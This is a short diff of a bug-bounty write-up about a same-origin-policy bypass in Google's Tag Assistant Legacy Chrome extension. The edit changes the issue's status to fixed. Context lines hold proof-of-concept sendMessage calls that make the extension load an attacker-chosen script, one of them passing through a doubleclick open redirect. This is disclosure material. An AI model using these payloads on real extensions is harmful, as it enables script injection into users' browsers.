@@ -155,7 +155,7 @@ headerDiv.innerHTML = html;
 
 This was fixed by removing the `clickNodeRef` method.
 
-# SOP bypass using Tag Assistant Legacy (Partly Fixed, $5000)
+# SOP bypass using Tag Assistant Legacy (Fixed, $5000)
 Downgraded as needs a compromised renderer, maybe CPU bugs work as well :/
 
 **URL:** <https://chrome.google.com/webstore/detail/tag-assistant-legacy-by-g/kejbdjndbnbjgmefkgdddjlbokphdefk>
@@ -166,7 +166,7 @@ chrome.runtime.sendMessage({message: 'LoadScript', url: 'http://192.168.1.1'}, c
 
 ### An alternative way
 The new security check has a list of allowed origins however there's open redirects!
-However this only works for the `application/javascript` content type.
+However this only worked for the `application/javascript` content type.
 ```js
 chrome.runtime.sendMessage({message: 'LoadScript', url: 'https://googleads.g.doubleclick.net/pcs/click?adurl=http://localhost:8000/x.js'}, console.log);
 ```
